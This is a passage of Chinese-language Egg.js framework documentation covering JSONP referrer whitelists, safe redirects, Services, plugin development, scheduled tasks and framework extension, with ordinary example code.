  // whiteList: [ 'sub.test.com', 'sub2.test.com' ],
};
whiteList 可以配置为正则表达式、字符串或者数组：

正则表达式：此时只有请求的 Referrer 匹配该正则时才允许访问 JSONP 接口。在设置正则表达式的时候，注意开头的 ^ 以及结尾的 \/，保证匹配到完整的域名。
exports.jsonp = {
  whiteList: /^https?:\/\/test.com\//,
};
// matches referrer:
// https://test.com/hello
// http://test.com/
字符串：设置字符串形式的白名单时分为两种，当字符串以 . 开头，例如 .test.com 时，代表 referrer 白名单为 test.com 的所有子域名，包括 test.com 自身。当字符串不以 . 开头，例如 sub.test.com，代表 referrer 白名单为 sub.test.com 这一个域名。（同时支持 HTTP 和 HTTPS）。
exports.jsonp = {
  whiteList: '.test.com',
};
// matches domain test.com:
// https://test.com/hello
// http://test.com/

// matches subdomain
// https://sub.test.com/hello
// http://sub.sub.test.com/

exports.jsonp = {
  whiteList: 'sub.test.com',
};
// only matches domain sub.test.com:
// https://sub.test.com/hello
// http://sub.test.com/
数组：当设置的白名单为数组时，代表只要满足数组中任意一个元素的条件即可通过 referrer 校验。
exports.jsonp = {
  whiteList: [ 'sub.test.com', 'sub2.test.com' ],
};
// matches domain sub.test.com and sub2.test.com:
// https://sub.test.com/hello
// http://sub2.test.com/
当 CSRF 和 referrer 校验同时开启时，请求发起方只需要满足任意一个条件即可通过 JSONP 的安全校验。

 设置 Header
我们通过状态码标识请求成功与否、状态如何，在 body 中设置响应的内容。而通过响应的 Header，还可以设置一些扩展信息。

通过 ctx.set(key, value) 方法可以设置一个响应头，ctx.set(headers) 设置多个 Header。

// app/controller/api.js
class ProxyController extends Controller {
  async show() {
    const ctx = this.ctx;
    const start = Date.now();
    ctx.body = await ctx.service.post.get();
    const used = Date.now() - start;
    // 设置一个响应头
    ctx.set('show-response-time', used.toString());
  }
};
 重定向
框架通过 security 插件覆盖了 koa 原生的 ctx.redirect 实现，以提供更加安全的重定向。

ctx.redirect(url) 如果不在配置的白名单域名内，则禁止跳转。
ctx.unsafeRedirect(url) 不判断域名，直接跳转，一般不建议使用，明确了解可能带来的风险后使用。
用户如果使用ctx.redirect方法，需要在应用的配置文件中做如下配置：

// config/config.default.js
exports.security = {
  domainWhiteList:['.domain.com'],  // 安全白名单，以 . 开头
};
若用户没有配置 domainWhiteList 或者 domainWhiteList数组内为空，则默认会对所有跳转请求放行，即等同于ctx.unsafeRedirect(url)

---------------------------------------------------
Service

简单来说，Service 就是在复杂业务场景下用于做业务逻辑封装的一个抽象层，提供这个抽象有以下几个好处：

保持 Controller 中的逻辑更加简洁。
保持业务逻辑的独立性，抽象出来的 Service 可以被多个 Controller 重复调用。
将逻辑和展现分离，更容易编写测试用例，测试用例的编写具体可以查看这里。

使用场景
复杂数据的处理，比如要展现的信息需要从数据库获取，还要经过一定的规则计算，才能返回用户显示。或者计算完成后，更新到数据库。
第三方服务的调用，比如 GitHub 信息获取等。
 定义 Service
// app/service/user.js
const Service = require('egg').Service;

class UserService extends Service {
  async find(uid) {
    const user = await this.ctx.db.query('select * from user where uid = ?', uid);
    return user;
  }
}

module.exports = UserService;

属性
每一次用户请求，框架都会实例化对应的 Service 实例，由于它继承于 egg.Service，故拥有下列属性方便我们进行开发：

this.ctx: 当前请求的上下文 Context 对象的实例，通过它我们可以拿到框架封装好的处理当前请求的各种便捷属性和方法。
this.app: 当前应用 Application 对象的实例，通过它我们可以拿到框架提供的全局对象和方法。
this.service：应用定义的 Service，通过它我们可以访问到其他业务层，等价于 this.ctx.service 。
this.config：应用运行时的配置项。
this.logger：logger 对象，上面有四个方法（debug，info，warn，error），分别代表打印四个不同级别的日志，使用方法和效果与 context logger 中介绍的一样，但是通过这个 logger 对象记录的日志，在日志前面会加上打印该日志的文件路径，以便快速定位日志打印位置。
 Service ctx 详解
为了可以获取用户请求的链路，我们在 Service 初始化中，注入了请求上下文, 用户在方法中可以直接通过 this.ctx 来获取上下文相关信息。关于上下文的具体详解可以参看 Context, 有了 ctx 我们可以拿到框架给我们封装的各种便捷属性和方法。比如我们可以用：

this.ctx.curl 发起网络调用。
this.ctx.service.otherService 调用其他 Service。
this.ctx.db 发起数据库调用等， db 可能是其他插件提前挂载到 app 上的模块。
 注意事项
Service 文件必须放在 app/service 目录，可以支持多级目录，访问的时候可以通过目录名级联访问。

app/service/biz/user.js => ctx.service.biz.user
app/service/sync_user.js => ctx.service.syncUser
app/service/HackerNews.js => ctx.service.hackerNews
一个 Service 文件只能包含一个类， 这个类需要通过 module.exports 的方式返回。

Service 需要通过 Class 的方式定义，父类必须是 egg.Service。

Service 不是单例，是 请求级别 的对象，框架在每次请求中首次访问 ctx.service.xx 时延迟实例化，所以 Service 中可以通过 this.ctx 获取到当前请求的上下文。


## 使用Service
使用 Service
下面就通过一个完整的例子，看看怎么使用 Service。

// app/router.js
module.exports = app => {
	app.router.get('/user/:id', app.controller.user.info);
};

// app/controller/user.js
const Controller = require('egg').Controller;
class UserController extends Controller {
	async info() {
		const userId = ctx.params.id;
		const userInfo = await ctx.service.user.find(userId);
		ctx.body = userInfo;
	}
}
module.exports = UserController;

// app/service/user.js
const Service = require('egg').Service;
class UserService extends Service {
	// 默认不需要提供构造函数。
	// constructor(ctx) {
	//   super(ctx); 如果需要在构造函数做一些处理，一定要有这句话，才能保证后面 `this.ctx`的使用。
	//   // 就可以直接通过 this.ctx 获取 ctx 了
	//   // 还可以直接通过 this.app 获取 app 了
	// }
	async find(uid) {
		// 假如 我们拿到用户 id 从数据库获取用户详细信息
		const user = await this.ctx.db.query('select * from user where uid = ?', uid);

		// 假定这里还有一些复杂的计算，然后返回需要的信息。
		const picture = await this.getPicture(uid);

		return {
			name: user.user_name,
			age: user.age,
			picture,
		};
	}

	async getPicture(uid) {
		const result = await this.ctx.curl(`http://photoserver/uid=${uid}`, { dataType: 'json'  });
			return result.data;
		}
}
module.exports = UserService;

// curl http://127.0.0.1:7001/user/1234

--------------------------------------------------
插件
我们在使用 Koa 中间件过程中发现了下面一些问题：

中间件加载其实是有先后顺序的，但是中间件自身却无法管理这种顺序，只能交给使用者。这样其实非常不友好，一旦顺序不对，结果可能有天壤之别。
中间件的定位是拦截用户请求，并在它前后做一些事情，例如：鉴权、安全检查、访问日志等等。但实际情况是，有些功能是和请求无关的，例如：定时任务、消息订阅、后台逻辑等等。
有些功能包含非常复杂的初始化逻辑，需要在应用启动的时候完成。这显然也不适合放到中间件中去实现。
综上所述，我们需要一套更加强大的机制，来管理、编排那些相对独立的业务逻辑。


中间件、插件、应用的关系
一个插件其实就是一个『迷你的应用』，和应用（app）几乎一样：

它包含了 Service、中间件、配置、框架扩展等等。
它没有独立的 Router 和 Controller。
他们的关系是：

应用可以直接引入 Koa 的中间件。
当遇到上一节提到的场景时，则应用需引入插件。
插件本身可以包含中间件。
多个插件可以包装为一个上层框架。

## 使用插件
使用插件
插件一般通过 npm 模块的方式进行复用：

$ npm i egg-mysql --save
注意：我们建议通过 ^ 的方式引入依赖，并且强烈不建议锁定版本。
{
  "dependencies": {
    "egg-mysql": "^3.0.0"
  }
}
然后需要在应用或框架的 config/plugin.js 中声明：

// config/plugin.js
// 使用 mysql 插件
exports.mysql = {
  enable: true,
  package: 'egg-mysql',
};
就可以直接使用插件提供的功能：

app.mysql.query(sql, values);

参数介绍
plugin.js 中的每个配置项支持：

{Boolean} enable - 是否开启此插件，默认为 true
{String} package - npm 模块名称，通过 npm 模块形式引入插件
{String} path - 插件绝对路径，跟 package 配置互斥
{Array} env - 只有在指定运行环境才能开启，会覆盖插件自身 package.json 中的配置
 开启和关闭
在上层框架内部内置的插件，应用在使用时就不用配置 package 或者 path，只需要指定 enable 与否：

// 对于内置插件，可以用下面的简洁方式开启或关闭
exports.onerror = false;

## 根据环境配置
同时，我们还支持 plugin.{env}.js 这种模式，会根据运行环境加载插件配置。

比如定义了一个开发环境使用的插件 egg-dev，只希望在本地环境加载，可以安装到 devDependencies。

// npm i egg-dev --save-dev
// package.json
{
  "devDependencies": {
    "egg-dev": "*"
  }
}
然后在 plugin.local.js 中声明：

// config/plugin.local.js
exports.dev = {
  enable: true,
  package: 'egg-dev',
};
这样在生产环境可以 npm i --production 不需要下载 egg-dev 的包了。

**注意: **

不存在 plugin.default.js
只能在应用层使用，在框架层请勿使用。

package 和 path
package 是 npm 方式引入，也是最常见的引入方式
path 是绝对路径引入，如应用内部抽了一个插件，但还没达到开源发布独立 npm 的阶段，或者是应用自己覆盖了框架的一些插件
关于这两种方式的使用场景，可以参见渐进式开发。
// config/plugin.js
const path = require('path');
exports.mysql = {
  enable: true,
  package: path.join(__dirname, '../lib/plugin/egg-mysql'),
};

插件配置
插件一般会包含自己的默认配置，应用开发者可以在 config.default.js 覆盖对应的配置：

// config/config.default.js
exports.mysql = {
  client: {
    host: 'mysql.com',
    port: '3306',
    user: 'test_user',
    password: 'test_password',
    database: 'test',
  },
};
具体合并规则可以参见配置。

 插件列表
框架默认内置了企业级应用常用的插件：
onerror 统一异常处理
Session Session 实现
i18n 多语言
watcher 文件和文件夹监控
multipart 文件流式上传
security 安全
development 开发环境配置
logrotator 日志切分
schedule 定时任务
static 静态服务器
jsonp jsonp 支持
view 模板引擎
更多社区的插件可以 GitHub 搜索 egg-plugin。

--------------------------------------------------
插件开发

插件开发
 使用脚手架快速开发
你可以直接通过 egg-init 选择 plugin 脚手架来快速上手。

$ egg-init --type=plugin egg-hello
$ cd egg-hello
$ npm i
$ npm test
 插件的目录结构
一个插件其实就是一个『迷你的应用』，下面展示的是一个插件的目录结构，和应用（app）几乎一样。

. egg-hello
├── package.json
├── app.js (可选)
├── agent.js (可选)
├── app
│   ├── extend (可选)
│   |   ├── helper.js (可选)
│   |   ├── request.js (可选)
│   |   ├── response.js (可选)
│   |   ├── context.js (可选)
│   |   ├── application.js (可选)
│   |   └── agent.js (可选)
│   ├── service (可选)
│   └── middleware (可选)
│       └── mw.js
├── config
|   ├── config.default.js
│   ├── config.prod.js
|   ├── config.test.js (可选)
|   ├── config.local.js (可选)
|   └── config.unittest.js (可选)
└── test
    └── middleware
        └── mw.test.js
那区别在哪儿呢？

插件没有独立的 router 和 controller。这主要出于几点考虑：

路由一般和应用强绑定的，不具备通用性。
一个应用可能依赖很多个插件，如果插件支持路由可能导致路由冲突。
如果确实有统一路由的需求，可以考虑在插件里通过中间件来实现。
插件需要在 package.json 中的 eggPlugin 节点指定插件特有的信息：

{String} name - 插件名（必须配置），具有唯一性，配置依赖关系时会指定依赖插件的 name。
{Array} dependencies - 当前插件强依赖的插件列表（如果依赖的插件没找到，应用启动失败）。
{Array} optionalDependencies - 当前插件的可选依赖插件列表（如果依赖的插件未开启，只会 warning，不会影响应用启动）。
{Array} env - 只有在指定运行环境才能开启，具体有哪些环境可以参考运行环境。此配置是可选的，一般情况下都不需要配置。
{
  "name": "egg-rpc",
  "eggPlugin": {
    "name": "rpc",
    "dependencies": [ "registry" ],
    "optionalDependencies": [ "vip" ],
    "env": [ "local", "test", "unittest", "prod" ]
  }
}
插件没有 plugin.js：

- `eggPlugin.dependencies` 只是用于声明依赖关系，而不是引入插件或开启插件。
- 如果期望统一管理多个插件的开启和配置，可以在[上层框架](./framework.md)处理。
 插件的依赖管理
和中间件不同，插件是自己管理依赖的。应用在加载所有插件前会预先从它们的 package.json 中读取 eggPlugin > dependencies 和 eggPlugin > optionalDependencies 节点，然后根据依赖关系计算出加载顺序，举个例子，下面三个插件的加载顺序就应该是 c => b => a

// plugin a
{
  "name": "egg-plugin-a",
  "eggPlugin": {
    "name": "a",
    "dependencies": [ "b" ]
  }
}

// plugin b
{
  "name": "egg-plugin-b",
  "eggPlugin": {
    "name": "b",
    "optionalDependencies": [ "c" ]
  }
}

// plugin c
{
  "name": "egg-plugin-c",
  "eggPlugin": {
    "name": "c"
  }
}
注意：dependencies 和 optionalDependencies 的取值是另一个插件的 eggPlugin.name，而不是 package name。

dependencies 和 optionalDependencies 是从 npm 借鉴来的概念，大多数情况下我们都使用 dependencies，这也是我们最推荐的依赖方式。那什么时候可以用 optionalDependencies 呢？大致就两种：

只在某些环境下才依赖，比如：一个鉴权插件，只在开发环境依赖一个 mock 数据的插件
弱依赖，比如：A 依赖 B，但是如果没有 B，A 有相应的降级方案
需要特别强调的是：如果采用 optionalDependencies 那么框架不会校验依赖的插件是否开启，它的作用仅仅是计算加载顺序。所以，这时候依赖方需要通过『接口探测』等方式来决定相应的处理逻辑。

 插件能做什么？
上面给出了插件的定义，那插件到底能做什么？

 扩展内置对象的接口
在插件相应的文件内对框架内置对象进行扩展，和应用一样

app/extend/request.js - 扩展 Koa#Request 类
app/extend/response.js - 扩展 Koa#Response 类
app/extend/context.js - 扩展 Koa#Context 类
app/extend/helper.js - 扩展 Helper 类
app/extend/application.js - 扩展 Application 类
app/extend/agent.js - 扩展 Agent 类
 插入自定义中间件
首先在 app/middleware 目录下定义好中间件实现
'use strict';

const staticCache = require('koa-static-cache');
const assert = require('assert');
const mkdirp = require('mkdirp');

module.exports = (options, app) => {
  assert.strictEqual(typeof options.dir, 'string', 'Must set `app.config.static.dir` when static plugin enable');

  // ensure directory exists
  mkdirp.sync(options.dir);

  app.loggers.coreLogger.info('[egg-static] starting static serve %s -> %s', options.prefix, options.dir);

  return staticCache(options);
};
在 app.js 中将中间件插入到合适的位置（例如：下面将 static 中间件放到 bodyParser 之前）
const assert = require('assert');

module.exports = app => {
  // 将 static 中间件放到 bodyParser 之前
  const index = app.config.coreMiddleware.indexOf('bodyParser');
  assert(index >= 0, 'bodyParser 中间件必须存在');

  app.config.coreMiddleware.splice(index, 0, 'static');
};
 在应用启动时做一些初始化工作
我在启动前想读取一些本地配置

// ${plugin_root}/app.js
const fs = require('fs');
const path = require('path');

module.exports = app => {
  app.customData = fs.readFileSync(path.join(app.config.baseDir, 'data.bin'));

  app.coreLogger.info('read data ok');
};
如果有异步启动逻辑，可以使用 app.beforeStart API

// ${plugin_root}/app.js
const MyClient = require('my-client');

module.exports = app => {
  app.myClient = new MyClient();
  app.myClient.on('error', err => {
    app.coreLogger.error(err);
  });
  app.beforeStart(async () => {
    await app.myClient.ready();
    app.coreLogger.info('my client is ready');
  });
};
也可以添加 agent 启动逻辑，使用 agent.beforeStart API

// ${plugin_root}/agent.js
const MyClient = require('my-client');

module.exports = agent => {
  agent.myClient = new MyClient();
  agent.myClient.on('error', err => {
    agent.coreLogger.error(err);
  });
  agent.beforeStart(async () => {
    await agent.myClient.ready();
    agent.coreLogger.info('my client is ready');
  });
};
 设置定时任务
在 package.json 里设置依赖 schedule 插件
{
  "name": "your-plugin",
  "eggPlugin": {
    "name": "your-plugin",
    "dependencies": [ "schedule" ]
  }
}
在 ${plugin_root}/app/schedule/ 目录下新建文件，编写你的定时任务
exports.schedule = {
  type: 'worker',
  cron: '0 0 3 * * *',
  // interval: '1h',
  // immediate: true,
};

exports.task = async ctx => {
  // your logic code
};
 全局实例插件的最佳实践
许多插件的目的都是将一些已有的服务引入到框架中，如 egg-mysql, egg-oss。他们都需要在 app 上创建对应的实例。而在开发这一类的插件时，我们发现存在一些普遍性的问题：

在一个应用中同时使用同一个服务的不同实例（连接到两个不同的 MySQL 数据库）。
从其他服务获取配置后动态初始化连接（从配置中心获取到 MySQL 服务地址后再建立连接）。
如果让插件各自实现，可能会出现各种奇怪的配置方式和初始化方式，所以框架提供了 app.addSingleton(name, creator) 方法来统一这一类服务的创建。需要注意的是在使用 app.addSingleton(name, creator) 方法时，配置文件中一定要有 client 或者 clients 为 key 的配置作为传入 creator 函数 的 config。

 插件写法
我们将 egg-mysql 的实现简化之后来看看如何编写此类插件：

// egg-mysql/app.js
module.exports = app => {
  // 第一个参数 mysql 指定了挂载到 app 上的字段，我们可以通过 `app.mysql` 访问到 MySQL singleton 实例
  // 第二个参数 createMysql 接受两个参数(config, app)，并返回一个 MySQL 的实例
  app.addSingleton('mysql', createMysql);
}

/**
 * @param  {Object} config   框架处理之后的配置项，如果应用配置了多个 MySQL 实例，会将每一个配置项分别传入并调用多次 createMysql
 * @param  {Application} app 当前的应用
 * @return {Object}          返回创建的 MySQL 实例
 */
function createMysql(config, app) {
  assert(config.host && config.port && config.user && config.database);
  // 创建实例
  const client = new Mysql(config);

  // 做启动应用前的检查
  app.beforeStart(async () => {
    const rows = await client.query('select now() as currentTime;');
    app.coreLogger.info(`[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`);
  });

  return client;
}
初始化方法也支持 Async function，便于有些特殊的插件需要异步化获取一些配置文件：

async function createMysql(config, app) {
  // 异步获取 mysql 配置
  const mysqlConfig = await app.configManager.getMysqlConfig(config.mysql);
  assert(mysqlConfig.host && mysqlConfig.port && mysqlConfig.user && mysqlConfig.database);
  // 创建实例
  const client = new Mysql(mysqlConfig);

  // 做启动应用前的检查
  const rows = await client.query('select now() as currentTime;');
  app.coreLogger.info(`[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`);

  return client;
}
可以看到，插件中我们只需要提供要挂载的字段以及对应服务的初始化方法，所有的配置管理、实例获取方式都由框架封装并统一提供了。

 应用层使用方案
 单实例
在配置文件中声明 MySQL 的配置。
// config/config.default.js
module.exports = {
  mysql: {
    client: {
      host: 'mysql.com',
      port: '3306',
      user: 'test_user',
      password: 'test_password',
      database: 'test',
    },
  },
};
直接通过 app.mysql 访问数据库。
// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.mysql.query(sql, values);
  },
}
 多实例
同样需要在配置文件中声明 MySQL 的配置，不过和单实例时不同，配置项中需要有一个 clients 字段，分别申明不同实例的配置，同时可以通过 default 字段来配置多个实例中共享的配置（如 host 和 port）。需要注意的是在这种情况下要用 get 方法指定相应的实例。（例如：使用 app.mysql.get('db1').query()，而不是直接使用 app.mysql.query() 得到一个 undefined）。
// config/config.default.js
exports.mysql = {
  clients: {
    // clientId, access the client instance by app.mysql.get('clientId')
    db1: {
      user: 'user1',
      password: 'upassword1',
      database: 'db1',
    },
    db2: {
      user: 'user2',
      password: 'upassword2',
      database: 'db2',
    },
  },
  // default configuration for all databases
  default: {
    host: 'mysql.com',
    port: '3306',
  },
};
通过 app.mysql.get('db1') 来获取对应的实例并使用。
// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.mysql.get('db1').query(sql, values);
  },
}
 动态创建实例
我们可以不需要将配置提前申明在配置文件中，而是在应用运行时动态的初始化一个实例。

// app.js
module.exports = app => {
  app.beforeStart(async () => {
    // 从配置中心获取 MySQL 的配置 { host, post, password, ... }
    const mysqlConfig = await app.configCenter.fetch('mysql');
    // 动态创建 MySQL 实例
    app.database = await app.mysql.createInstanceAsync(mysqlConfig);
  });
};
通过 app.database 来使用这个实例。

// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.database.query(sql, values);
  },
}
注意，在动态创建实例的时候，框架也会读取配置中 default 字段内的配置项作为默认配置。

 插件的寻址规则
框架在加载插件的时候，遵循下面的寻址规则：

如果配置了 path，直接按照 path 加载

没有 path 根据 package 名去查找，查找的顺序依次是

应用根目录下的 node_modules
应用依赖框架路径下的 node_modules
当前路径下的 node_modules （主要是兼容单元测试场景）
 插件规范
我们非常欢迎您贡献新的插件，同时也希望您遵守下面一些规范：

命名规范

npm 包名以 egg- 开头，且为全小写，例如：egg-xx。比较长的词组用中划线：egg-foo-bar
对应的插件名使用小驼峰，小驼峰转换规则以 npm 包名的中划线为准 egg-foo-bar => fooBar
对于可以中划线也可以不用的情况，不做强制约定，例如：userservice(egg-userservice) 还是 user-service(egg-user-service) 都可以
package.json 书写规范

按照上面的文档添加 eggPlugin 节点
在 keywords 里加上 egg、egg-plugin、eggPlugin 等关键字，便于索引
{
  "name": "egg-view-nunjucks",
  "version": "1.0.0",
  "description": "view plugin for egg",
  "eggPlugin": {
    "name": "nunjucks",
    "dep": [
      "security"
    ]
  },
  "keywords": [
    "egg",
    "egg-plugin",
    "eggPlugin",
    "egg-plugin-view",
    "egg-view",
    "nunjucks"
  ],
}
 为何不使用 npm 包名来做插件名？
Egg 是通过 eggPlugin.name 来定义插件名的，只在应用或框架具备唯一性，也就是说多个 npm 包可能有相同的插件名，为什么这么设计呢？

首先 Egg 插件不仅仅支持 npm 包，还支持通过目录来找插件。在渐进式开发章节提到如何使用这两个配置来进行代码演进。目录对单元测试也比较友好。所以 Egg 无法通过 npm 的包名来做唯一性。

更重要的是 Egg 可以使用这种特性来做适配器。比如模板开发规范定义的插件名为 view，而存在 egg-view-nunjucks，egg-view-react 等插件，使用者只需要更换插件和修改模板，不需要动 Controller， 因为所有的模板插件都实现了相同的 API。

将相同功能的插件赋予相同的插件名，具备相同的 API，可以快速切换。这在模板、数据库等领域非常适用。

--------------------------------------------------
定时任务

虽然我们通过框架开发的 HTTP Server 是请求响应模型的，但是仍然还会有许多场景需要执行一些定时任务，例如：

定时上报应用状态。
定时从远程接口更新本地缓存。
定时进行文件切割、临时文件删除。

## 编写定时任务
所有的定时任务都统一存放在 app/schedule 目录下，每一个文件都是一个独立的定时任务，可以配置定时任务的属性和要执行的方法。

一个简单的例子，我们定义一个更新远程数据到内存缓存的定时任务，就可以在 app/schedule 目录下创建一个 update_cache.js 文件

const Subscription = require('egg').Subscription;

class UpdateCache extends Subscription {
  // 通过 schedule 属性来设置定时任务的执行间隔等配置
  static get schedule() {
    return {
      interval: '1m', // 1 分钟间隔
      type: 'all', // 指定所有的 worker 都需要执行
    };
  }

  // subscribe 是真正定时任务执行时被运行的函数
  async subscribe() {
    const res = await this.ctx.curl('http://www.api.com/cache', {
      dataType: 'json',
    });
    this.ctx.app.cache = res.data;
  }
}

module.exports = UpdateCache;
还可以简写为

module.exports = {
  schedule: {
    interval: '1m', // 1 分钟间隔
    type: 'all', // 指定所有的 worker 都需要执行
  },
  async task(ctx) {
    const res = await ctx.curl('http://www.api.com/cache', {
      dataType: 'json',
    });
    ctx.app.cache = res.data;
  },
};
这个定时任务会在每一个 Worker 进程上每 1 分钟执行一次，将远程数据请求回来挂载到 app.cache 上。

任务
task 或 subscribe 同时支持 generator function 和 async function。
task 的入参为 ctx，匿名的 Context 实例，可以通过它调用 service 等。
 定时方式
定时任务可以指定 interval 或者 cron 两种不同的定时方式。

 interval
通过 schedule.interval 参数来配置定时任务的执行时机，定时任务将会每间隔指定的时间执行一次。interval 可以配置成

数字类型，单位为毫秒数，例如 5000。
字符类型，会通过 ms 转换成毫秒数，例如 5s。
module.exports = {
  schedule: {
    // 每 10 秒执行一次
    interval: '10s',
  },
};
 cron
通过 schedule.cron 参数来配置定时任务的执行时机，定时任务将会按照 cron 表达式在特定的时间点执行。cron 表达式通过 cron-parser 进行解析。

注意：cron-parser 支持可选的秒（linux crontab 不支持）。

*    *    *    *    *    *
┬    ┬    ┬    ┬    ┬    ┬
│    │    │    │    │    |
│    │    │    │    │    └ day of week (0 - 7) (0 or 7 is Sun)
│    │    │    │    └───── month (1 - 12)
│    │    │    └────────── day of month (1 - 31)
│    │    └─────────────── hour (0 - 23)
│    └──────────────────── minute (0 - 59)
└───────────────────────── second (0 - 59, optional)
module.exports = {
  schedule: {
    // 每三小时准点执行一次
    cron: '0 0 */3 * * *',
  },
};


类型
框架提供的定时任务默认支持两种类型，worker 和 all。worker 和 all 都支持上面的两种定时方式，只是当到执行时机时，会执行定时任务的 worker 不同：

worker 类型：每台机器上只有一个 worker 会执行这个定时任务，每次执行定时任务的 worker 的选择是随机的。
all 类型：每台机器上的每个 worker 都会执行这个定时任务。
 其他参数
除了刚才介绍到的几个参数之外，定时任务还支持这些参数：

cronOptions: 配置 cron 的时区等，参见 cron-parser 文档
immediate：配置了该参数为 true 时，这个定时任务会在应用启动并 ready 后立刻执行一次这个定时任务。
disable：配置该参数为 true 时，这个定时任务不会被启动。
 执行日志
执行日志会输出到 ${appInfo.root}/logs/{app_name}/egg-schedule.log，默认不会输出到控制台，可以通过 config.customLogger.scheduleLogger 来自定义。

// config/config.default.js
config.customLogger = {
  scheduleLogger: {
    // consoleLevel: 'NONE',
    // file: path.join(appInfo.root, 'logs', appInfo.name, 'egg-schedule.log'),
  },
};

执行日志
执行日志会输出到 ${appInfo.root}/logs/{app_name}/egg-schedule.log，默认不会输出到控制台，可以通过 config.customLogger.scheduleLogger 来自定义。

// config/config.default.js
config.customLogger = {
  scheduleLogger: {
    // consoleLevel: 'NONE',
    // file: path.join(appInfo.root, 'logs', appInfo.name, 'egg-schedule.log'),
  },
};
 动态配置定时任务
有时候我们需要判断不同的环境来配置定时任务的参数。定时任务还有支持另一种写法：

module.exports = app => {
  return {
    schedule: {
      interval: '1m',
      type: 'all',
      disable: app.config.env === 'local', // 本地开发环境不执行
    },
    async task(ctx) {
      const res = await ctx.curl('http://www.api.com/cache', {
        contentType: 'json',
      });
      ctx.app.cache = res.data;
    },
  };
};

 手动执行定时任务
我们可以通过 app.runSchedule(schedulePath) 来运行一个定时任务。app.runSchedule 接受一个定时任务文件路径（app/schedule 目录下的相对路径或者完整的绝对路径），执行对应的定时任务，返回一个 Promise。

有一些场景我们可能需要手动的执行定时任务，例如

通过手动执行定时任务可以更优雅的编写对定时任务的单元测试。
const mm = require('egg-mock');
const assert = require('assert');

it('should schedule work fine', async () => {
  const app = mm.app();
  await app.ready();
  await app.runSchedule('update_cache');
  assert(app.cache);
});

应用启动时，手动执行定时任务进行系统初始化，等初始化完毕后再启动应用。参见应用启动自定义章节，我们可以在 app.js 中编写初始化逻辑。
module.exports = app => {
  app.beforeStart(async () => {
    // 保证应用启动监听端口前数据已经准备好了
    // 后续数据的更新由定时任务自动触发
    await app.runSchedule('update_cache');
  });
};

 扩展定时任务类型
默认框架提供的定时任务只支持每台机器的单个进程执行和全部进程执行，有些情况下，我们的服务并不是单机部署的，这时候可能有一个集群的某一个进程执行一个定时任务的需求。

框架并没有直接提供此功能，但开发者可以在上层框架自行扩展新的定时任务类型。

在 agent.js 中继承 agent.ScheduleStrategy，然后通过 agent.schedule.use() 注册即可：

module.exports = agent => {
  class ClusterStrategy extends agent.ScheduleStrategy {
    start() {
      // 订阅其他的分布式调度服务发送的消息，收到消息后让一个进程执行定时任务
      // 用户在定时任务的 schedule 配置中来配置分布式调度的场景（scene）
      agent.mq.subscribe(schedule.scene, () => this.sendOne());
    }
  }
  agent.schedule.use('cluster', ClusterStrategy);
};
ScheduleStrategy 基类提供了：

schedule - 定时任务的属性，disable 是默认统一支持的，其他配置可以自行解析。
this.sendOne(...args) - 随机通知一个 worker 执行 task，args 会传递给 subscribe(...args) 或 task(ctx, ...args)。
this.sendAll(...args) - 通知所有的 worker 执行 task。

--------------------------------------------------
框架扩展

框架扩展
框架提供了多种扩展点扩展自身的功能：

Application
Context
Request
Response
Helper
在开发中，我们既可以使用已有的扩展 API 来方便开发，也可以对以上对象进行自定义扩展，进一步加强框架的功能。

 Application
app 对象指的是 Koa 的全局应用对象，全局只有一个，在应用启动时被创建。

 访问方式
ctx.app

Controller，Middleware，Helper，Service 中都可以通过 this.app 访问到 Application 对象，例如 this.app.config 访问配置对象。

在 app.js 中 app 对象会作为第一个参数注入到入口函数中

// app.js
module.exports = app => {
  // 使用 app 对象
};

 扩展方式
框架会把 app/extend/application.js 中定义的对象与 Koa Application 的 prototype 对象进行合并，在应用启动时会基于扩展后的 prototype 生成 app 对象。

 方法扩展
例如，我们要增加一个 app.foo() 方法：

// app/extend/application.js
module.exports = {
  foo(param) {
    // this 就是 app 对象，在其中可以调用 app 上的其他方法，或访问属性
  },
};

 属性扩展
一般来说属性的计算只需要进行一次，那么一定要实现缓存，否则在多次访问属性时会计算多次，这样会降低应用性能。

推荐的方式是使用 Symbol + Getter 的模式。

例如，增加一个 app.bar 属性 Getter：

// app/extend/application.js
const BAR = Symbol('Application#bar');

module.exports = {
  get bar() {
    // this 就是 app 对象，在其中可以调用 app 上的其他方法，或访问属性
    if (!this[BAR]) {
      // 实际情况肯定更复杂
      this[BAR] = this.config.xx + this.config.yy;
    }
    return this[BAR];
  },
};
 Context
Context 指的是 Koa 的请求上下文，这是 请求级别 的对象，每次请求生成一个 Context 实例，通常我们也简写成 ctx。在所有的文档中，Context 和 ctx 都是指 Koa 的上下文对象。

 访问方式
middleware 中 this 就是 ctx，例如 this.cookies.get('foo')。
controller 有两种写法，类的写法通过 this.ctx，方法的写法直接通过 ctx 入参。
helper，service 中的 this 指向 helper，service 对象本身，使用 this.ctx 访问 context 对象，例如 this.ctx.cookies.get('foo')。
 扩展方式
框架会把 app/extend/context.js 中定义的对象与 Koa Context 的 prototype 对象进行合并，在处理请求时会基于扩展后的 prototype 生成 ctx 对象。

 方法扩展
例如，我们要增加一个 ctx.foo() 方法：

// app/extend/context.js
module.exports = {
  foo(param) {
    // this 就是 ctx 对象，在其中可以调用 ctx 上的其他方法，或访问属性
  },
};
 属性扩展
一般来说属性的计算在同一次请求中只需要进行一次，那么一定要实现缓存，否则在同一次请求中多次访问属性时会计算多次，这样会降低应用性能。

推荐的方式是使用 Symbol + Getter 的模式。

例如，增加一个 ctx.bar 属性 Getter：

// app/extend/context.js
const BAR = Symbol('Context#bar');

module.exports = {
  get bar() {
    // this 就是 ctx 对象，在其中可以调用 ctx 上的其他方法，或访问属性
    if (!this[BAR]) {
      // 例如，从 header 中获取，实际情况肯定更复杂
      this[BAR] = this.get('x-bar');
    }
    return this[BAR];
  },
};

 Request
Request 对象和 Koa 的 Request 对象相同，是 请求级别 的对象，它提供了大量请求相关的属性和方法供使用。

 访问方式
ctx.request
ctx 上的很多属性和方法都被代理到 request 对象上，对于这些属性和方法使用 ctx 和使用 request 去访问它们是等价的，例如 ctx.url === ctx.request.url。

Koa 内置的代理 request 的属性和方法列表：Koa - Request aliases

 扩展方式
